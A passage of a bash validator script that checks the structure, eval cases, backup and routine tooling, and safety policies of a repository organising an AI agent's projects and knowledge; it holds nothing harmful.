    fail "the retired projects/<name>/repository/ layout is still tracked: $tracked_child"
  done < <(printf '%s\n' "$tracked_files_snapshot" | grep -E '^projects/[^/]+/repository/' | head -n 5 || true)
fi
while IFS= read -r -d '' legacy_repository; do
  fail "the retired projects/<name>/repository/ clone still exists: $(relative_path "$legacy_repository") — migrate it per tools/BACKUP.md"
done < <(find "$repo_root/projects" -mindepth 3 -maxdepth 3 -type d -path '*/repository/.git' -print0 2>/dev/null)

if git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
  while IFS= read -r gitlink_path; do
    [[ -n "$gitlink_path" ]] || continue
    fail "root index holds a gitlink (mode 160000): $gitlink_path — Independent repositories are plain clones"
  done < <(git -C "$repo_root" ls-files --stage | awk '$1 == "160000" { print $4 }')
fi
[[ ! -e "$repo_root/.gitmodules" ]] || \
  fail '.gitmodules is forbidden; Independent repositories are plain clones, not submodules'

validate_project_contract "$repo_root/projects/_template/PROJECT.md"
validate_project_state "$repo_root/projects/_template/STATE.md"
while IFS= read -r -d '' project_file; do
  [[ "$project_file" == "$repo_root/projects/_template/PROJECT.md" ]] && continue
  validate_project_contract "$project_file"
  validate_project_state "$(dirname "$project_file")/STATE.md"
  validate_project_docs "$(dirname "$project_file")"
done < <(find "$repo_root/projects" "$repo_root/evals/fixtures" \
  \( "${repository_prune[@]}" \) -prune -o -type f -name 'PROJECT.md' -print0)

validate_skill "$repo_root/skills/_template/SKILL.md"
while IFS= read -r -d '' skill_file; do
  [[ "$skill_file" == "$repo_root/skills/_template/SKILL.md" ]] && continue
  validate_skill "$skill_file"
done < <(find "$repo_root/skills" "$repo_root/evals/fixtures" \
  \( "${repository_prune[@]}" \) -prune -o -type f -name 'SKILL.md' -print0)

while IFS= read -r -d '' page; do
  case "$page" in */README.md) continue ;; esac
  validate_knowledge_page "$page"
done < <(find \
  "$repo_root/knowledge/wiki/sources" "$repo_root/knowledge/wiki/topics" \
  "$repo_root/evals/fixtures" -type f -name '*.md' \
  \( -path '*/knowledge/wiki/sources/*' -o -path '*/knowledge/wiki/topics/*' \) -print0)
validate_knowledge_page "$knowledge_source_template"
validate_knowledge_page "$knowledge_topic_template"

validate_knowledge_index_and_log

required_cases=(
  project-correction-recovery project-finite-completion
  project-goal-change-protection project-state-closeout protect-immutable-records protect-paused-project
  route-to-knowledge route-to-project route-to-skill temporary-code-isolation project-delete-requires-retired
  knowledge-bounded-retrieval knowledge-superseded-redirect knowledge-original-escalation
  catalog-failure-fallback project-completed-not-default project-required-only context-budget-stop
  large-file-section-read ambiguous-target-no-broad-scan meta-route-validator-change
  project-read-no-terminal-processing meta-read-no-full-validator project-work-scoped-validation
  knowledge-log-auto-rotation scale-sqlite-auto-enable
  backup-auto-after-verified-commit backup-divergence-refusal restore-single-writer
  backup-failure-local-success backup-workspace-repository-boundary independent-consolidation-audit
  autonomous-internal-change-commit autonomous-validator-self-repair
  router-size-overflow-delegation independent-push-policy-gated
  external-effect-approval-gate canon-conflict-escalation unowned-change-conflict
  independent-promotion-session-boundary independent-repository-materialization
  independent-remote-update-handoff root-clean-independent-repository-safety
  root-agents-router-scope project-agents-optional project-agents-diff-only
  project-agents-no-contract-copy project-agents-claude-bridge
  knowledge-internal-record-storage knowledge-external-source-storage
  research-question-to-project research-method-to-skill project-research-knowledge-promotion
  project-docs-route-required project-docs-design-entry project-architecture-entry
  project-domain-sense-not-spec project-docs-readme-forbidden independent-root-content-boundary
  canonical-area-entry-names
  routine-trigger-meta-route routine-deterministic-without-model routine-clean-noop
  routine-stale-cache-regeneration routine-dirty-tree-skipped routine-active-lock-skipped
  routine-base-sha-abort routine-reasoning-disabled-offline routine-unsupported-provider-rejected
  routine-model-forbidden-path-blocked routine-model-shell-command-refused
  routine-model-patch-limit-blocked routine-sandbox-failure-not-applied
  routine-commit-gated-backup routine-root-independent-boundary
  routine-scheduler-darwin-launchd routine-scheduler-default-cron routine-schedule-install-explicit
  control-policy-tamper control-mixed-scope-commit-split control-ordinary-failure-no-penalty
  delegation-default-off delegation-depth-one
  upstream-issue-privacy upstream-issue-preapproved-send upstream-issue-fixed-destination
)

for case_name in "${required_cases[@]}"; do require_file "$repo_root/evals/cases/$case_name.yaml"; done

while IFS= read -r -d '' case_file; do
  require_fixed_line "$case_file" 'request: |'
  require_fixed_line "$case_file" 'expect:'
  grep -Eq '^name: [a-z0-9-]+$' "$case_file" || fail "$(relative_path "$case_file") has an invalid name"
  grep -Eq '^  route: (knowledge|skill|project|meta|none)([[:space:]]|$)' "$case_file" || \
    fail "$(relative_path "$case_file") has an invalid route"
  grep -Fq '  must_read:' "$case_file" || fail "$(relative_path "$case_file") is missing must_read"

  if grep -Eq '^  route: project([[:space:]]|$)' "$case_file"; then
    if grep -Eq '    - projects/.+/PROJECT\.md' "$case_file"; then
      grep -Eq '    - projects/.+/STATE\.md' "$case_file" || \
        fail "$(relative_path "$case_file") requires a Project contract but not its STATE.md"
    elif ! grep -A3 -F '  must_search:' "$case_file" | grep -Fq 'command: tools/find-context.sh'; then
      fail "$(relative_path "$case_file") Project route must read PROJECT.md/STATE.md or use tools/find-context.sh"
    fi
  fi
  max_candidates="$(sed -n 's/^  max_candidates: //p' "$case_file" | head -n 1)"
  if [[ -n "$max_candidates" ]] && { [[ ! "$max_candidates" =~ ^[1-5]$ ]]; }; then
    fail "$(relative_path "$case_file") max_candidates must be 1..5"
  fi
  fixture_name="$(sed -n 's/^fixture: //p' "$case_file" | head -n 1)"
  if [[ -n "$fixture_name" && ! -d "$repo_root/evals/fixtures/$fixture_name" ]]; then
    fail "$(relative_path "$case_file") references missing fixture: $fixture_name"
  fi
done < <(find "$repo_root/evals/cases" -type f -name '*.yaml' -print0)

# Check existence first so an empty glob does not abort with a raw sed error.
duplicate_case_names=''
if compgen -G "$repo_root/evals/cases/*.yaml" >/dev/null 2>&1; then
  duplicate_case_names="$(sed -n 's/^name: //p' "$repo_root"/evals/cases/*.yaml | LC_ALL=C sort | uniq -d)"
fi
[[ -z "$duplicate_case_names" ]] || fail "duplicate eval case names: $duplicate_case_names"

if ! grep -Eq '    - projects/.+/STATE\.md#現在の目標=.+' "$repo_root/evals/cases/project-state-closeout.yaml"; then
  fail 'project-state-closeout does not require advancing the current goal'
fi
grep -Fq 'projects/site-migration/PROJECT.md#status=completed' "$repo_root/evals/cases/project-finite-completion.yaml" || \
  fail 'project-finite-completion does not require status=completed'
grep -Fq 'projects/site-migration/STATE.md#現在の目標=なし（Project完了）' \
  "$repo_root/evals/cases/project-finite-completion.yaml" || \
  fail 'project-finite-completion does not close the current goal'
grep -Fq 'projects/site-migration/STATE.md#次の一手=なし（Project完了）' \
  "$repo_root/evals/cases/project-finite-completion.yaml" || \
  fail 'project-finite-completion does not close the next action'

backup_tool="$repo_root/tools/backup-to-github.sh"
if [[ -d "$repo_root/.github/workflows" ]]; then
  fail '.github/workflows is forbidden; GitHub is a passive backup, not an execution platform'
fi
if [[ -f "$backup_tool" ]]; then
  [[ -x "$backup_tool" ]] || fail 'tools/backup-to-github.sh is not executable'
  "$syntax_bash" -n "$backup_tool" 2>/dev/null || fail 'tools/backup-to-github.sh fails bash -n'

  allowed_git_subcommands='cat-file check-ref-format config diff fetch for-each-ref init ls-files ls-remote merge-base push rev-list rev-parse symbolic-ref'
  while IFS= read -r subcommand; do
    [[ -n "$subcommand" ]] || continue
    case " $allowed_git_subcommands " in
      *" $subcommand "*) ;;
      *) fail "tools/backup-to-github.sh uses a git subcommand outside the backup allowlist: $subcommand" ;;
    esac
  done < <(awk '
    {
      line = $0
      sub(/(^|[[:space:]])#.*$/, "", line)
      gsub(/[<>|&;]/, " SEP ", line)
      gsub(/[^A-Za-z0-9_.-]/, " ", line)
      n = split(line, token, /[[:space:]]+/)
      for (i = 1; i <= n; i++) {
        if (token[i] != "git") continue
        j = i + 1
        while (j <= n && (token[j] == "-C" || token[j] == "-c")) j += 2
        while (j <= n && substr(token[j], 1, 1) == "-") j++
        if (j <= n && token[j] != "" && token[j] != "SEP") print token[j]
      }
    }
  ' "$backup_tool" | LC_ALL=C sort -u)

  for forbidden_flag in --force --force-with-lease --mirror --prune --delete; do
    if grep -Fq -- "$forbidden_flag" "$backup_tool"; then
      fail "tools/backup-to-github.sh must not use $forbidden_flag"
    fi
  done

  push_invocations="$(grep -Ec 'git[^#]*[[:space:]]push[[:space:]]' "$backup_tool" || true)"
  if (( push_invocations != 1 )); then
    fail "tools/backup-to-github.sh must contain exactly one git push invocation (found $push_invocations)"
  fi
  if ! grep -Eq 'git[^#]*[[:space:]]push[[:space:]]+--porcelain[[:space:]]+"\$remote"[[:space:]]+"HEAD:refs/heads/\$branch"' \
    "$backup_tool"; then
    fail 'tools/backup-to-github.sh must push only the explicit HEAD:refs/heads/$branch refspec'
  fi
fi

materialize_tool="$repo_root/tools/materialize-project-repositories.sh"
if [[ -f "$materialize_tool" ]]; then
  [[ -x "$materialize_tool" ]] || fail 'tools/materialize-project-repositories.sh is not executable'
  "$syntax_bash" -n "$materialize_tool" 2>/dev/null || \
    fail 'tools/materialize-project-repositories.sh fails bash -n'
  for forbidden_flag in --force --mirror --hard; do
    if grep -Fq -- "$forbidden_flag" "$materialize_tool"; then
      fail "tools/materialize-project-repositories.sh must not use $forbidden_flag"
    fi
  done
  # Never mutate an existing clone with reset/clean/stash/merge/rebase.
  for forbidden_subcommand in reset clean stash merge rebase pull; do
    if grep -Eq "git[^#]*[[:space:]]$forbidden_subcommand[[:space:]]" "$materialize_tool"; then
      fail "tools/materialize-project-repositories.sh must not run git $forbidden_subcommand"
    fi
  done
  grep -Fq 'MATERIALIZATION_OK' "$materialize_tool" || \
    fail 'tools/materialize-project-repositories.sh does not emit MATERIALIZATION_OK'
  grep -Fq 'MATERIALIZATION_BLOCKED' "$materialize_tool" || \
    fail 'tools/materialize-project-repositories.sh does not emit MATERIALIZATION_BLOCKED'
fi

report_tool="$repo_root/tools/report-upstream-issue.sh"
if [[ -f "$report_tool" ]]; then
  [[ -x "$report_tool" ]] || fail 'tools/report-upstream-issue.sh is not executable'
  "$syntax_bash" -n "$report_tool" 2>/dev/null || fail 'tools/report-upstream-issue.sh fails bash -n'

  # The destination is a contract (tools/UPSTREAM.md): exactly one fixed assignment, no override path.
  fixed_destination_count="$(grep -cF "upstream_repo='claudagt/agent-directory'" "$report_tool" || true)"
  if [[ "$fixed_destination_count" != '1' ]]; then
    fail 'tools/report-upstream-issue.sh must fix upstream_repo to claudagt/agent-directory exactly once'
  fi
  if grep -Eq -- '--repo\)' "$report_tool"; then
    fail 'tools/report-upstream-issue.sh must not accept a --repo argument'
  fi
  if grep -E 'gh issue' "$report_tool" | grep -Fv -- '--repo "$upstream_repo"' | grep -q .; then
    fail 'tools/report-upstream-issue.sh must pass --repo "$upstream_repo" on every gh issue invocation'
  fi
  for report_token in UPSTREAM_REPORT_OK UPSTREAM_REPORT_BLOCKED UPSTREAM_REPORT_DRAFTED; do
    grep -Fq "$report_token" "$report_tool" || \
      fail "tools/report-upstream-issue.sh does not emit $report_token"
  done
  # The reporting path never writes to git state.
  for forbidden_subcommand in push pull merge rebase reset clean commit; do
    if grep -Eq "git[^#]*[[:space:]]$forbidden_subcommand[[:space:]]" "$report_tool"; then
      fail "tools/report-upstream-issue.sh must not run git $forbidden_subcommand"
    fi
  done
  # Anonymization is fail-closed: an unparseable self-definition must block, never skip the rule.
  grep -Fq 'anonymization-source-unparsed' "$report_tool" || \
    fail 'tools/report-upstream-issue.sh must fail closed when no agent name is extractable from AGENTS.md#自己定義'
fi

grep -Fq 'tools/backup-to-github.sh' "$repo_root/README.md" || \
  fail 'README.md does not register tools/backup-to-github.sh'
grep -Fq 'tools/BACKUP.md' "$repo_root/README.md" || fail 'README.md does not register tools/BACKUP.md'
grep -Fq 'tools/materialize-project-repositories.sh' "$repo_root/README.md" || \
  fail 'README.md does not register tools/materialize-project-repositories.sh'
grep -Fq 'backup-to-github.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register backup-to-github.sh'
grep -Fq 'report-upstream-issue.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register report-upstream-issue.sh'
grep -Fq 'tools/UPSTREAM.md' "$repo_root/AGENTS.md" || \
  fail 'AGENTS.md does not route upstream issue reporting to tools/UPSTREAM.md'
grep -Fq 'materialize-project-repositories.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register materialize-project-repositories.sh'
grep -Fq 'prepare-context.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register prepare-context.sh'
if [[ -f "$repo_root/tools/prepare-context.sh" ]]; then
  "$syntax_bash" -n "$repo_root/tools/prepare-context.sh" 2>/dev/null || \
    fail 'tools/prepare-context.sh fails bash -n'
fi
grep -Fq 'finalize-task.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register finalize-task.sh'
if [[ -f "$repo_root/tools/finalize-task.sh" ]]; then
  "$syntax_bash" -n "$repo_root/tools/finalize-task.sh" 2>/dev/null || \
    fail 'tools/finalize-task.sh fails bash -n'
fi
grep -Fq 'BACKUP.md' "$repo_root/tools/TOOLS.md" || fail 'tools/TOOLS.md does not register BACKUP.md'
for scope_token in WORKSPACE_BACKUP_OK ROOT_BACKUP_OK; do
  grep -Fq "$scope_token" "$repo_root/tools/BACKUP.md" || \
    fail "tools/BACKUP.md does not document the $scope_token result line"
done
grep -Fq 'tools/BACKUP.md' "$repo_root/AGENTS.md" || \
  fail 'AGENTS.md does not delegate backup details to tools/BACKUP.md'

# --- Control boundary layer checks (canon: tools/CONTROL.md) ------------------------------------

require_file "$repo_root/tools/CONTROL.md"
require_file "$repo_root/tools/control-policy.tsv"
for control_tool in tools/check-boundary.sh tools/install-git-hooks.sh \
  tools/hooks/pre-commit tools/hooks/pre-push; do
  if [[ -f "$repo_root/$control_tool" ]]; then
    [[ -x "$repo_root/$control_tool" ]] || fail "$control_tool is not executable"
    "$syntax_bash" -n "$repo_root/$control_tool" 2>/dev/null || fail "$control_tool fails bash -n"
  fi
done

# The policy is a strict TSV with a fixed tier vocabulary; the verifier refuses anything else.
if [[ -f "$repo_root/tools/control-policy.tsv" ]]; then
  if ! awk -F '\t' '
      /^($|#)/ { next }
      $1 !~ /^(exempt|forbidden|frozen|guarded|contract)$/ || $2 == "" || NF > 3 { bad = 1 }
      END { exit bad }
    ' "$repo_root/tools/control-policy.tsv"; then
    fail 'tools/control-policy.tsv has a row outside the tier<TAB>pattern<TAB>note schema'
  fi
  # Pin the load-bearing rows so the policy is not silently weakened.
  for pinned_policy in 'forbidden:.env*' 'frozen:knowledge/raw/*' 'frozen:knowledge/wiki/logs/*' \
    'guarded:AGENTS.md' 'guarded:README.md' 'guarded:tools/*' 'guarded:evals/*' 'guarded:routines/*' \
    'contract:projects/*/PROJECT.md'; do
    pinned_tier="${pinned_policy%%:*}"
    pinned_pattern="${pinned_policy#*:}"
    awk -F '\t' -v t="$pinned_tier" -v p="$pinned_pattern" \
      '$1 == t && $2 == p { found = 1 } END { exit !found }' \
      "$repo_root/tools/control-policy.tsv" || \
      fail "tools/control-policy.tsv lost a pinned row: $pinned_tier $pinned_pattern"
  done
fi

grep -Fq 'tools/CONTROL.md' "$repo_root/README.md" || fail 'README.md does not register tools/CONTROL.md'
grep -Fq 'tools/install-git-hooks.sh' "$repo_root/README.md" || \
  fail 'README.md does not register tools/install-git-hooks.sh'
grep -Fq 'check-boundary.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register check-boundary.sh'
grep -Fq 'install-git-hooks.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register install-git-hooks.sh'
grep -Fq 'CONTROL.md' "$repo_root/tools/TOOLS.md" || fail 'tools/TOOLS.md does not register CONTROL.md'
grep -Fq 'tools/CONTROL.md' "$repo_root/AGENTS.md" || \
  fail 'AGENTS.md does not delegate boundary enforcement to tools/CONTROL.md'
# The hook layer performs boundary checks only; it never becomes a backup or validation trigger.
grep -Fq 'backup' "$repo_root/tools/CONTROL.md" || \
  fail 'tools/CONTROL.md does not scope git hooks against the backup non-goal'

# --- Verify the Human-on-the-loop contract exists in the canon ----------

# The root holds the autonomy defaults and the escalation gates; each Owner holds the detailed enumeration.
for autonomy_heading in '## 自律実行' '## 人間へ上げる例外'; do
  grep -Fqx -- "$autonomy_heading" "$repo_root/AGENTS.md" || \
    fail "AGENTS.md must carry the Human-on-the-loop section: $autonomy_heading"
done

# Each of the four escalation categories routes to the canon that owns its details.
for exception_owner in projects/LIFECYCLE.md projects/PROJECTS.md tools/BACKUP.md tools/TOOLS.md; do
  grep -Fq "$exception_owner" "$repo_root/AGENTS.md" || \
    fail "AGENTS.md must route an escalation category to its canon: $exception_owner"
done

# Details live on the Owner side; do not restate them at the root, and do not leave the Owner empty.
while IFS='|' read -r owner_doc owner_heading; do
  [[ -n "$owner_doc" ]] || continue
  grep -Fqx -- "$owner_heading" "$repo_root/$owner_doc" || \
    fail "$owner_doc must own the Human-on-the-loop section: $owner_heading"
done <<'AUTONOMY_OWNERS'
tools/TOOLS.md|## 自律実行の標準完了
tools/TOOLS.md|## 自己修復と停止
tools/TOOLS.md|### 超過時の標準処理
tools/BACKUP.md|## 実行trigger
tools/BACKUP.md|## remoteの分類
tools/BACKUP.md|## backupが失敗したとき
tools/CONTROL.md|## 違反の分類
tools/CONTROL.md|## 違反の代謝
tools/CONTROL.md|## 導入基準（将来拡張の凍結）
projects/PROJECTS.md|#### push policy
projects/LIFECYCLE.md|## 人間が決める遷移
knowledge/KNOWLEDGE.md|### 大きいKnowledgeの扱い
evals/EVALS.md|## 自律実行と例外ケースの最低条件
AUTONOMY_OWNERS

# The push policy vocabulary is exactly auto and gated.
grep -Fq '`auto`' "$repo_root/projects/PROJECTS.md" && grep -Fq '`gated`' "$repo_root/projects/PROJECTS.md" || \
  fail 'projects/PROJECTS.md must define both push policy values: auto and gated'

# Pin the size budgets so they are not silently raised.
while IFS= read -r budget_row; do
  [[ -n "$budget_row" ]] || continue
  grep -Fqx -- "$budget_row" "$repo_root/tools/TOOLS.md" || \
    fail "tools/TOOLS.md size budget row was raised or removed: $budget_row"
done <<'SIZE_BUDGET_ROWS'
| `AGENTS.md`（ルート） | 8KiB。6KiB超はwarning |
| `projects/AGENTS.md` | 2KiB |
| `projects/<name>/AGENTS.md` | 2KiB |
SIZE_BUDGET_ROWS

# --- Routine Trigger layer checks (canon: routines/ROUTINES.md)--------------------------------

# A Routine is a Trigger, not a Route. Never add `routine` to the Route table or the Route enum.
if [[ -f "$repo_root/AGENTS.md" ]]; then
  if grep -Eq '^\| *`routine` *\|' "$repo_root/AGENTS.md"; then
    fail 'AGENTS.md defines routine as a Route; a Routine is a trigger, not a Route'
  fi
  grep -Fq 'routines/ROUTINES.md' "$repo_root/AGENTS.md" || \
    fail 'AGENTS.md does not carry the conditional entry to routines/ROUTINES.md'
fi
if [[ -f "$repo_root/tools/find-context.sh" ]] && grep -Fq 'routine)' "$repo_root/tools/find-context.sh"; then
  fail 'tools/find-context.sh must not accept routine as a search route'
fi
if [[ -f "$repo_root/routines/ROUTINES.md" ]]; then
  grep -Fq 'RoutineはRouteではない' "$repo_root/routines/ROUTINES.md" || \
    fail 'routines/ROUTINES.md must state that a Routine is not a Route'
  for routine_heading in '## 標準フロー' '## Single Writerと競合防止' '## 予算と上限' \
    '## 外部Providerへの送信' '## commitとbackup' '## 結果語彙' '## 将来のRoutine追加'; do
    grep -Fqx -- "$routine_heading" "$repo_root/routines/ROUTINES.md" || \
      fail "routines/ROUTINES.md is missing the section: $routine_heading"
  done
  for routine_token in ROUTINE_NOOP ROUTINE_OK ROUTINE_SKIPPED ROUTINE_BLOCKED ROUTINE_FAILED; do
    grep -Fq "$routine_token" "$repo_root/routines/ROUTINES.md" || \
      fail "routines/ROUTINES.md does not document the $routine_token result"
  done
fi
if [[ -f "$repo_root/routines/maintenance/ROUTINE.md" ]]; then
  for maintenance_heading in '## 日次の決定的Maintenance' '## 広域検証の周期' '## NOOP' \
    '## optional reasoningと修復境界'; do
    grep -Fqx -- "$maintenance_heading" "$repo_root/routines/maintenance/ROUTINE.md" || \
      fail "routines/maintenance/ROUTINE.md is missing the section: $maintenance_heading"
  done
fi

# The initial version ships Maintenance only. Do not pre-create Research files or empty templates.
for premature_routine_path in routines/research routines/_template routines/AGENTS.md routines/CLAUDE.md; do
  [[ ! -e "$repo_root/$premature_routine_path" ]] || \
    fail "$premature_routine_path must not exist; only the Maintenance Routine ships in v1"
done
if [[ -d "$repo_root/routines" ]]; then
  while IFS= read -r -d '' routine_root_entry; do
    routine_entry_name="${routine_root_entry##*/}"
    if [[ -f "$routine_root_entry" ]]; then
      [[ "$routine_entry_name" == 'ROUTINES.md' ]] || \
        fail "routines/ must contain only ROUTINES.md and routine directories: $(relative_path "$routine_root_entry")"
    else
      require_file "$routine_root_entry/ROUTINE.md"
      if [[ -f "$repo_root/tools/run-routine.sh" ]] && \
        ! grep -Eq "^  $routine_entry_name\) ;;\$" "$repo_root/tools/run-routine.sh"; then
        fail "tools/run-routine.sh does not register the routine id: $routine_entry_name"
      fi
    fi
  done < <(find "$repo_root/routines" -mindepth 1 -maxdepth 1 \( -type f -o -type d \) \
    ! -name '.gitkeep' ! -name '.DS_Store' -print0 2>/dev/null)
fi

# Routine Tool executable bits, syntax, and safety boundaries.
for routine_tool in tools/run-routine.sh tools/manage-routine-schedule.sh; do
  routine_tool_file="$repo_root/$routine_tool"
  [[ ! -f "$routine_tool_file" ]] && continue
  [[ -x "$routine_tool_file" ]] || fail "$routine_tool is not executable"
  "$syntax_bash" -n "$routine_tool_file" 2>/dev/null || fail "$routine_tool fails bash -n"
done
if [[ -f "$repo_root/tools/run-routine.sh" ]]; then
  grep -Fq 'unknown-routine' "$repo_root/tools/run-routine.sh" || \
    fail 'tools/run-routine.sh does not reject unknown routine ids'
  for forbidden_routine_git in reset clean stash pull merge rebase push; do
    if grep -Eq "git[^#]*[[:space:]]$forbidden_routine_git([[:space:]]|\$)" "$repo_root/tools/run-routine.sh"; then
      fail "tools/run-routine.sh must not run git $forbidden_routine_git"
    fi
  done
fi
if [[ -f "$repo_root/tools/manage-routine-schedule.sh" ]]; then
  grep -Fq 'LaunchAgents' "$repo_root/tools/manage-routine-schedule.sh" || \
    fail 'tools/manage-routine-schedule.sh must manage user LaunchAgents'
  if grep -Fq 'LaunchDaemons' "$repo_root/tools/manage-routine-schedule.sh"; then
    fail 'tools/manage-routine-schedule.sh must not touch LaunchDaemons'
  fi
  if grep -Fq 'backup-to-github' "$repo_root/tools/manage-routine-schedule.sh"; then
    fail 'tools/manage-routine-schedule.sh must not schedule backups; schedule arrival is not a backup trigger'
  fi
fi
if [[ -f "$repo_root/tools/routine-reasoner.py" ]]; then
  grep -Fq 'SUPPORTED_PROVIDERS = ("deepseek", "openai", "anthropic")' "$repo_root/tools/routine-reasoner.py" || \
    fail 'tools/routine-reasoner.py provider enum must be exactly deepseek | openai | anthropic'
  if command -v python3 >/dev/null 2>&1; then
    python3 -c "import ast; ast.parse(open('$repo_root/tools/routine-reasoner.py').read())" 2>/dev/null || \
      fail 'tools/routine-reasoner.py fails Python syntax parsing'
    if python3 -c "
import ast, sys
tree = ast.parse(open('$repo_root/tools/routine-reasoner.py').read())
allowed = {'json', 'os', 'socket', 'sys', 'urllib.error', 'urllib.request'}
for node in ast.walk(tree):
    names = []
    if isinstance(node, ast.Import):
        names = [alias.name for alias in node.names]
    elif isinstance(node, ast.ImportFrom):
        names = [node.module or '']
    for name in names:
        if name not in allowed:
            sys.exit(1)
" 2>/dev/null; then :; else
      fail 'tools/routine-reasoner.py imports outside the standard-library allowlist'
    fi
  fi
fi

# .env.example carries placeholders only; no real values and no real model IDs.
if [[ -f "$repo_root/.env.example" ]]; then
  grep -Fq 'deepseek | openai | anthropic' "$repo_root/.env.example" || \
    fail '.env.example does not document the provider enum deepseek | openai | anthropic'
  for empty_env_key in AGENT_ROUTINE_REASONING_PROVIDER AGENT_ROUTINE_REASONING_MODEL \
    DEEPSEEK_API_KEY OPENAI_API_KEY ANTHROPIC_API_KEY \
    DEEPSEEK_BASE_URL OPENAI_BASE_URL ANTHROPIC_BASE_URL; do
    grep -Eq "^$empty_env_key=$" "$repo_root/.env.example" || \
      fail ".env.example must declare $empty_env_key with an empty placeholder value"
    if grep -Eq "^$empty_env_key=..*" "$repo_root/.env.example"; then
      fail ".env.example must not carry a real value for $empty_env_key"
    fi
  done
  grep -Eq '^AGENT_ROUTINE_REASONING_ENABLED=false$' "$repo_root/.env.example" || \
    fail '.env.example must default AGENT_ROUTINE_REASONING_ENABLED to false'
fi

# The Routine canon enters the meta catalog as a conditional candidate; runtime derivatives are never Git-tracked.
if [[ -f "$repo_root/tools/build-context-cache.sh" ]]; then
  grep -Fq "'routines/ROUTINES.md|" "$repo_root/tools/build-context-cache.sh" || \
    fail 'tools/build-context-cache.sh does not register routines/ROUTINES.md as meta canon'
fi
if [[ -n "$tracked_files_snapshot" ]]; then
  while IFS= read -r tracked_routine_file; do
    [[ -n "$tracked_routine_file" ]] || continue
    case "$tracked_routine_file" in
      routines/*.md) ;;
      routines/*)
        fail "routines/ may track Markdown canon only: $tracked_routine_file"
        ;;
    esac
    case "$tracked_routine_file" in
      *.plist|*.lock|*routines/logs/*|*routines/locks/*|*routines/state/*)
        fail "routine runtime state must not be tracked: $tracked_routine_file"
        ;;
    esac
  done < <(printf '%s\n' "$tracked_files_snapshot" | grep -E '^routines/|\.plist$|\.lock$' || true)
fi

grep -Fq 'run-routine.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register run-routine.sh'
grep -Fq 'manage-routine-schedule.sh' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register manage-routine-schedule.sh'
grep -Fq 'routine-reasoner.py' "$repo_root/tools/TOOLS.md" || \
  fail 'tools/TOOLS.md does not register routine-reasoner.py'
grep -Fq 'routines/ROUTINES.md' "$repo_root/README.md" || \
  fail 'README.md does not register routines/ROUTINES.md'
grep -Fq 'run-routine.sh' "$repo_root/README.md" || \
  fail 'README.md does not register run-routine.sh'
grep -Fq 'manage-routine-schedule.sh' "$repo_root/README.md" || \
  fail 'README.md does not register manage-routine-schedule.sh'
grep -Fq 'schedule到達' "$repo_root/tools/BACKUP.md" || \
  fail 'tools/BACKUP.md does not scope scheduled maintenance against the backup trigger'
grep -Fq 'backup-only Routine' "$repo_root/tools/BACKUP.md" || \
  fail 'tools/BACKUP.md does not forbid backup-only routines'
grep -Fqx '## Routineケースの最低条件' "$repo_root/evals/EVALS.md" || \
  fail 'evals/EVALS.md does not own the Routine case minimum conditions'

# Integration fixtures for real Git, cache, backup, and the materializer run only under --full.
# The default run is limited to static structural checks; Tool changes require --full (owned by tools/TOOLS.md).
# AGENT_VALIDATOR_NESTED_FIXTURE is an internal marker preventing recursive runs of a validator
# invoked from inside a fixture; it is never set in normal operation.
if [[ "$full" == true && -z "${AGENT_VALIDATOR_NESTED_FIXTURE:-}" ]]; then
cache_test_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-cache.XXXXXX")"
fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-fixture.XXXXXX")"
sqlite_fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-sqlite.XXXXXX")"
log_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-log.XXXXXX")"
backup_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-backup.XXXXXX")"
malformed_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-malformed.XXXXXX")"
malformed_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-malformed-cache.XXXXXX")"
# Cleanup is handled in one place by the opening EXIT trap (cleanup_tmp_paths). Do not override the trap here.
cleanup_paths+=("$cache_test_dir" "$fixture_cache_dir" "$sqlite_fixture_cache_dir" \
  "$log_fixture_dir" "$backup_fixture_dir" "$malformed_fixture_dir" "$malformed_cache_dir")
if ! AGENT_CACHE_DIR="$cache_test_dir" bash "$repo_root/tools/build-context-cache.sh" >/dev/null; then
  fail 'build-context-cache.sh failed to generate a cache'
elif ! AGENT_CACHE_DIR="$cache_test_dir" bash "$repo_root/tools/build-context-cache.sh" --check >/dev/null; then
  fail 'build-context-cache.sh --check reports a freshly generated cache as stale'
elif ! AGENT_CACHE_DIR="$cache_test_dir" bash "$repo_root/tools/build-context-cache.sh" --check-routing >/dev/null; then
  fail 'build-context-cache.sh --check-routing reports a fresh catalog as stale'
fi
if grep -Eq '^head=' "$cache_test_dir/cache.meta"; then
  fail 'cache.meta must not use Git HEAD as a freshness input'
fi
if [[ -f "$cache_test_dir/manifest.tsv" ]]; then
  for immutable_area in knowledge/raw/internal knowledge/raw/external; do
    if awk -F '\t' -v area="$immutable_area/" '
        index($1, area) == 1 && $6 != "true" { bad = 1 }
        END { exit !bad }
      ' "$cache_test_dir/manifest.tsv"; then
      fail "build-context-cache.sh must mark every file under $immutable_area/ as immutable in manifest.tsv"
    fi
  done
fi

mkdir -p "$log_fixture_dir/knowledge/wiki"
{
  printf '# LOG — fixture\n\n---\n\n'
  i=1
  while (( i <= 999 )); do
    printf '2026-08-02  lint        fixture/%04d  threshold fixture\n' "$i"
    i=$((i + 1))
  done
} > "$log_fixture_dir/$knowledge_log_path"
if ! AGENT_DIRECTORY_ROOT="$log_fixture_dir" bash "$repo_root/tools/append-knowledge-log.sh" \
  --date 2026-08-02 --type lint --target fixture/1000 --summary 'threshold fixture' >/dev/null; then
